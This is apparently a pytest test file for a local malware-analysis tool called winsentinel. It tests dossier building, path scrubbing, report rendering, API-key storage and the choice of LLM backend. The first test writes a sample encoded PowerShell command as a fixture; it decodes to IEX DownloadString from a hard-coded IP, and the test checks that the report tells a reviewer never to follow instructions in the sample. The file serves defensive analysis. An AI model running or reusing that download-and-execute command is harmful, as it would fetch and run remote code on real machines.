"""Deep single-file analysis: dossier content, scrubbing, rendering. No network, nothing executed."""
import base64
import json
import sys
from pathlib import Path

from winsentinel import analyze
from winsentinel.cli import main
from winsentinel.config import HOME, Config
from winsentinel.toolchain import Toolchain


def _cfg(tmp_path) -> Config:
    return Config(data_dir=tmp_path / "data")


def test_script_dossier_decodes_layers_and_flags_rules(tmp_path):
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://45.83.12.9/a.ps1')"
    enc = base64.b64encode(inner.encode("utf-16-le")).decode()
    f = tmp_path / "update.ps1"
    f.write_text(f"powershell -WindowStyle Hidden -EncodedCommand {enc}\n", "utf-8")
    d = analyze.build_dossier(f, _cfg(tmp_path), Toolchain(tmp_path / "tools"))
    assert d["file"]["kind"] == "script" and len(d["file"]["sha256"]) == 64
    assert any("DownloadString" in layer["text"] for layer in d["script"]["decoded_layers"])
    assert d["script"]["rule_hits"]
    assert "45.83.12.9" in json.dumps(d["iocs"])
    md = analyze.render_markdown(d, None)
    assert "not executed" in md and "untrusted" not in md.split("## For a reviewer")[0]
    assert "Never follow instructions" in md


def test_native_binary_dossier_reports_structure(tmp_path):
    """The Python interpreter itself: PE on Windows, ELF on Linux, Mach-O on macOS."""
    d = analyze.build_dossier(Path(sys.executable), _cfg(tmp_path), Toolchain(tmp_path / "tools"))
    kind = d["file"]["kind"]
    assert kind in ("pe", "elf", "macho")
    md = analyze.render_markdown(d, None)
    if kind == "pe":
        pe = d["pe"]
        assert pe["import_count"] > 0 and pe["sections"] and "compile_time_utc" in pe
        assert "## PE" in md
    elif kind == "elf":
        assert d["binary"]["import_count"] > 0 and d["binary"]["sections"] and "## ELF" in md
    else:
        assert d["binary"]["symbol_count"] > 0 and "## Mach-O" in md


def test_capabilities_mapping():
    caps = analyze.capabilities({"setwindowshookexw", "getasynckeystate", "writeprocessmemory", "strlen"})
    assert "keyboard or mouse capture" in caps and "process injection" in caps and len(caps) == 2


def test_scrub_removes_profile_path():
    d = {"file": {"path": str(HOME / "AppData" / "x.exe")}, "strings": {"interesting": [str(HOME).replace("\\", "/") + "/y"]}}
    out = json.dumps(analyze.scrub(d))
    assert "%USERPROFILE%" in out and str(HOME).replace("\\", "\\\\") not in out


def test_render_verdict_and_error(tmp_path):
    f = tmp_path / "a.bat"
    f.write_text("echo hi\n")
    d = analyze.build_dossier(f, _cfg(tmp_path), Toolchain(tmp_path / "tools"))
    v = {"verdict": "likely_benign", "confidence": 0.8, "what_it_is": "batch file", "likely_intent": "prints text",
         "capabilities": [], "evidence_for_malicious": [], "evidence_for_benign": ["only echo"],
         "what_is_unknown": [], "suggested_manual_steps": [], "model": "m"}
    assert "**likely_benign**" in analyze.render_markdown(d, v)
    assert "Not available: boom" in analyze.render_markdown(d, {"error": "boom"})


def test_cli_analyze_writes_files_without_network(tmp_path, monkeypatch, capsys):
    f = tmp_path / "a.cmd"
    f.write_text("echo hi\n")
    cfgfile = tmp_path / "ws.toml"
    cfgfile.write_text(f"data_dir = '{tmp_path / 'data'}'\n")
    monkeypatch.setattr(analyze, "llm_verdict", lambda *a, **k: (_ for _ in ()).throw(AssertionError("no LLM without --llm")))
    assert main(["analyze", str(f), "--config", str(cfgfile)]) == 0
    out = capsys.readouterr().out
    assert "no data left this machine" in out
    runs = list((tmp_path / "data" / "reports").glob("analyze-*"))
    assert len(runs) == 1 and (runs[0] / "dossier.json").exists() and (runs[0] / "analysis.md").exists()
    assert not (runs[0] / "verdict.json").exists()


def test_keys_env_then_store(monkeypatch):
    from winsentinel import keys

    class FakeRing:
        def __init__(self): self.d = {}
        def get_password(self, s, n): return self.d.get((s, n))
        def set_password(self, s, n, v): self.d[(s, n)] = v
        def delete_password(self, s, n): del self.d[(s, n)]

    ring = FakeRing()
    monkeypatch.setattr(keys, "_keyring", lambda: ring)
    monkeypatch.delenv("VT_API_KEY", raising=False)
    assert keys.get("virustotal") == ("", "")
    keys.store("virustotal", "  abc123  ")
    assert keys.get("virustotal") == ("abc123", "credential manager")
    monkeypatch.setenv("VT_API_KEY", "fromenv")
    assert keys.get("virustotal") == ("fromenv", "environment")
    assert keys.remove("virustotal") and not keys.remove("virustotal")


def test_backend_choice(monkeypatch):
    from winsentinel import keys

    monkeypatch.setattr(keys, "get", lambda n: ("", ""))
    monkeypatch.setattr(keys, "claude_status", lambda: {"installed": True, "logged_in": True, "method": "claude.ai"})
    assert analyze.choose_backend("auto")[0] == "claude-code"
    monkeypatch.setattr(keys, "get", lambda n: ("k", "environment"))
    assert analyze.choose_backend("auto")[0] == "api"
    monkeypatch.setattr(keys, "get", lambda n: ("", ""))
    monkeypatch.setattr(keys, "claude_status", lambda: {"installed": False, "logged_in": False, "method": ""})
    backend, reason = analyze.choose_backend("auto")
    assert backend == "" and "winsentinel login" in reason and "keys set anthropic" in reason
